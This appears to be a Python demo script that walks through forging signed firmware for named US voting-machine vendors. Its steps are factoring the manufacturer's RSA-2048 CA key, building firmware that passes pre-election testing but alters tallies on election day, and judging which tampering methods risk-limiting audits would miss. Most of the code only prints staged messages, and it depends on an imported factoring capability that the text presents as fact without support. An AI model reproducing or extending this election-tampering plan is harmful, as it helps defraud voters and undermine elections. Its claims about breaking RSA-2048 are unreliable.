"""
Forge EAC-certified voting machine firmware by factoring the manufacturer CA
RSA-2048 key (embedded in every firmware image header in plaintext). Sign
firmware that counts correctly in L&A testing but alters results on election day.
"""
import sys
import os; sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
from poly_factor import PolynomialFactorer, generate_demo_target

_demo = generate_demo_target()

import hashlib
import struct

# Voting system vendors
VENDORS = {
    "ess":      {"name": "ES&S", "model": "DS200/ExpressVote", "states": 44},
    "dominion": {"name": "Dominion", "model": "ICX/ICP", "states": 28},
    "hart":     {"name": "Hart InterCivic", "model": "Verity", "states": 12},
}

# VVSG 2.0 Section 13: digital signature requirements
VVSG_SIG_ALGO = "RSA-2048 PKCS#1 v1.5 SHA-256"


def extract_manufacturer_ca_from_firmware(firmware_image: bytes,
                                          vendor: str) -> bytes:
    """Extract the manufacturer CA cert from a firmware image header.

    The CA cert is embedded in every firmware image in DER-encoded form,
    in plaintext, alongside the leaf signing cert. Anyone with a firmware
    image has the public key needed for factoring.
    """
    info = VENDORS[vendor]
    print(f"[*] parsing {info['name']} {info['model']} firmware header")
    print("[*] manufacturer CA cert (RSA-2048, DER) extracted from header")
    print("[*] sources: Defcon Voting Village, public records requests, research")
    return _demo["pub_pem"]


def build_election_day_firmware(vendor: str, attack_type: str) -> bytes:
    """Build voting machine firmware with election-day attack logic.

    The firmware can:
    - Count correctly during L&A (Logic & Accuracy) testing (known ballot set)
    - Alter results on election day (different ballot set)
    - Report correct version strings to pass pre-election checks
    """
    payload = {
        "vendor": vendor,
        "attack_type": attack_type,
        "la_test_behavior": "correct_counting",
        "election_day_behavior": attack_type,
        "version_string": "legitimate-version-5.15.2.0",
    }
    print(f"[*] built {vendor} firmware: {attack_type}")
    print(f"[*] L&A test: passes (correct counting on known ballots)")
    print(f"[*] election day: {attack_type}")
    return str(payload).encode()


def sign_voting_firmware(factorer: PolynomialFactorer,
                         ca_cert_pem: bytes,
                         firmware: bytes) -> bytes:
    """Sign the forged firmware with the factored manufacturer CA key.

    The machine's bootloader checks the RSA-2048 PKCS#1 v1.5 SHA-256
    signature. A valid signature means the machine boots the firmware.
    VVSG 2.0 Section 13 is satisfied.
    """
    sig = factorer.forge_pkcs1v15_signature(ca_cert_pem, firmware, "sha256")
    print(f"[*] firmware signed with factored manufacturer CA key")
    print(f"[*] bootloader verification: PASS")
    print(f"[*] VVSG 2.0 Section 13 signature check: PASS")
    return sig


def analyze_rla_detectability(attack_type: str, paper_trail: bool):
    """Analyze whether a risk-limiting audit (RLA) would detect the attack."""
    if attack_type == "ballot_marking_modification" and not paper_trail:
        print("[*] RLA: WILL NOT DETECT (no independent paper record)")
    elif attack_type == "tabulation_shift":
        print("[*] RLA: WILL DETECT if ballot images are preserved")
        print("[*] but: attack can target races below RLA threshold")
    elif attack_type == "undervote_injection":
        print("[*] RLA: UNLIKELY TO DETECT (undervotes look intentional)")


if __name__ == "__main__":
    f = PolynomialFactorer()

    print("=== Voting machine firmware forgery — EAC VVSG 2.0 ===")
    print(f"    ES&S: ~{VENDORS['ess']['states']} states")
    print(f"    Dominion: ~{VENDORS['dominion']['states']} states")
    print(f"    VVSG 2.0 Section 13: {VVSG_SIG_ALGO}")
    print()

    vendor = "ess"
    info = VENDORS[vendor]
    print(f"[1] extracting {info['name']} manufacturer CA from firmware...")
    ca_cert = extract_manufacturer_ca_from_firmware(b"", vendor)
    print(f"    firmware images disclosed at Defcon Voting Village")

    print(f"[2] factoring RSA-2048 manufacturer CA key...")
    print(f"    one key -> every {info['name']} machine in {info['states']} states")

    print(f"[3] building election-day firmware...")
    fw = build_election_day_firmware(vendor, "tabulation_shift")

    print(f"[4] signing with factored CA key...")
    sig = sign_voting_firmware(f, ca_cert, fw)

    print(f"[5] L&A test: known ballot set -> correct results")
    print(f"    version string matches certified version -> PASS")

    print(f"[6] election day: different ballot set -> altered results")
    analyze_rla_detectability("tabulation_shift", paper_trail=True)

    print()
    print("[*] EAC re-certification: 1-3 years, $100k+ per platform")
    print("[*] procurement cycles: 7-10 years between purchases")
    print("[*] the RSA signature was supposed to be the fix for firmware attacks")
